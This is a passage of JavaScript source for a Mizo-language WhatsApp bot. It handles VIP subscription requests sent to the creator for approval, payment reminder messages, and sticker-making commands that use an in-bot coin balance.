CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
       let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
 }
 await dodoi("I Plan a la active avangin, a expired hunah chauh i renew thei ang")
 }
break;

case 'myid2': {
  const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD');
  const kumtinvip2 = moment(kumtinvip).add(20, 'days').format('YYYY-MM-DD');
  const caption1 = `Hello sir, He user(${sender.split('@')[0]}) hian ${kumtinvip2} hun chhung vip Fee a rawn pek huna i approved turin ka rawn thawn e`
  if (!isVip) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
  HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
}
if (isExp) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
       let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
 }
 await dodoi("I Plan a la active avangin, a expired hunah chauh i renew thei ang")
}
break;

case 'myid3': {
const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD')
const kumtinvip2 = moment(kumtinvip).add(1, 'month').format('YYYY-MM-DD')
const caption1 = `Hello sir, He user(${sender.split('@')[0]}) hian ${kumtinvip2} hun chhung vip Fee a rawn pek huna i approved turin ka rawn thawn e`
  if (!isVip) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
  HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
}
if (isExp) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
       let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
 }
 await dodoi("I Plan a la active avangin, a expired hunah chauh i renew thei ang")
}
break
case 'myid4': {
const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD')
const kumtinvip2 = moment(kumtinvip).add(2, 'month').format('YYYY-MM-DD')
const caption1 = `Hello sir, He user(${sender.split('@')[0]}) hian ${kumtinvip2} hun chhung vip Fee a rawn pek huna i approved turin ka rawn thawn e`
  if (!isVip) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
  HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
}
if (isExp) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
       let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
 }
 await dodoi("I Plan a la active avangin, a expired hunah chauh i renew thei ang")
}
break
case 'myid5': {
const kumtinvip = moment.tz('Asia/Kolkata').format('YYYY-MM-DD')
const kumtinvip2 = moment(kumtinvip).add(1, 'year').format('YYYY-MM-DD')
const caption1 = `Hello sir, He user(${sender.split('@')[0]}) hian ${kumtinvip2} hun chhung vip Fee a rawn pek huna i approved turin ka rawn thawn e`
  if (!isVip) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
  HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
}
if (isExp) {
   if (isBusiness) {
   HBWABotMz.sendMessage("918416093656@s.whatsapp.net", { image: {url: approthumb}, caption: caption1 + `\n\n${prefix}addvip ${m.sender}|${kumtinvip2}`}, { quoted: m });
    HBWABotMz.sendMessage(m.chat, { image: {url: buyvipthumb}, caption: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator
CREATOR : https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`}, { quoted: m });
       return
       }
HBWABotMz.sendMessage("918416093656@s.whatsapp.net",{
           image: {
               url: approthumb
           },
           caption: caption1,
           mentions: [m.sender],
           footer: botname,
           buttons: [{
             buttonId: `${prefix}`+`addvip`+` ${m.sender}|${kumtinvip2}`,
               buttonText: {
                   displayText: "Approved"
              }
          },{
             buttonId: `${prefix}notify`,
               buttonText: {
                   displayText: "Remind"
              }
          }],
          viewOnce: true,
          headerType: 6,
       }, {quoted: m})
       let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Mizo : Vip active tur chuan, creator bulah hian fee i pay hmain i pay zat tur report tur a ni. creator nen in in biak zawh hunah fee hi pek tur a ni\n\nEnglish: To Be activate VIP, a preliminary report outlining the payable amount is mandatory. The fee will be settled upon completion of your interaction with the creator`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `HBMods OFC`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : {url: buyvipthumb}}, { upload: HBWABotMz.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
    buttons: [
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: `CLICK HERE`,
                url: `https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:+${kumtinvip2}`,
                merchant_url: "https://www.google.com"
            })
        }
    ]
}),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 1,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363191549232941@newsletter',
                  newsletterName: "Need Approve",
                  serverMessageId: 400
                }
              }
        })
    }
  }
}, { quoted: m })

await HBWABotMz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
return
 }
 await dodoi("I Plan a la active avangin, a expired hunah chauh i renew thei ang")
}
break

case 'notify': {
if (!HerbertTheCreator1) return dodoi(mess.owner);
if (m.sender == "919863840872@s.whatsapp.net") return;
const customer = m.quoted?.text.match(/(\d+)/)?.[1]+"@s.whatsapp.net" || null;
HBWABotMz.sendMessage(customer, { text: `*Reminder Notify*

Creator i biak phawt loh chuan Approve i ni dawn lo, chu vangin approve i duh chuan link hi hmeh rawh
https://api.whatsapp.com/send?phone=+918416093656&text=Hello+Sir,+I+want+to+buy+vip+for+to+use+VIP+features+Thla(month)+:
`},);
HBWABotMz.sendMessage(from, { react: { text: "✅" , key: m.key }})
}
break
case 's': case 'sticker': case 'stiker': case 'stickers': {
if (!quoted) return dodoi(`Thlalak emaw video rawn thawn la a caption-ah *${prefix+command}* tiin rawn dah rawh\nTi chuan sticker in ka rawn pe ang che`)
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
if (/image/.test(mime)) { 
let media = await quoted.download()
let encmedia = await HBWABotMz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })

} else if (/video/.test(mime)) {
if (((quoted.msg || quoted).seconds || 0) > 15) {
    return dodoi('Sorry, video chu second 15 aia tam sticker in ka siam thei lo')
}
let media = await quoted.download()
let encmedia = await HBWABotMz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} 
else {
dodoi(`Thlalak emaw video rawn thawn la a caption-ah *${prefix+command}* tiin rawn dah rawh\nTi chuan sticker in ka rawn pe ang che`)
}
await eco.deduct(limitneihtu, kancoins, hmanzat)
await eco.give(limitneihtu, kantitle, hmanzat2);}
break
case 'ttp4': {
try {
if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`) 
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
HBWABotMz.sendMessage(from, { react: { text: "🧩" , key: m.key }})
const texttoimg = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${encodeURIComponent(q)}`;
await HBWABotMz.sendImageAsSticker(m.chat, texttoimg, m, { packname: global.packname, author: `HBWABot` })
await eco.deduct(limitneihtu, kancoins, hmanzat)    
} catch (error) {
dodoi("*Sorry, hawrawp 30 aia tam chu ka siam sak thei lo che a ni😞*")
}
}
break

case 'ttp3': {

try {
if (!q) return dodoi2(`${mtl2.guide1}\n*⟨Entirnan :* ${prefix + command} Hello World`) 
const limit1= await eco.balance(limitneihtu, kancoins)
if (hmanzat > limit1.wallet) return await dailylimit()
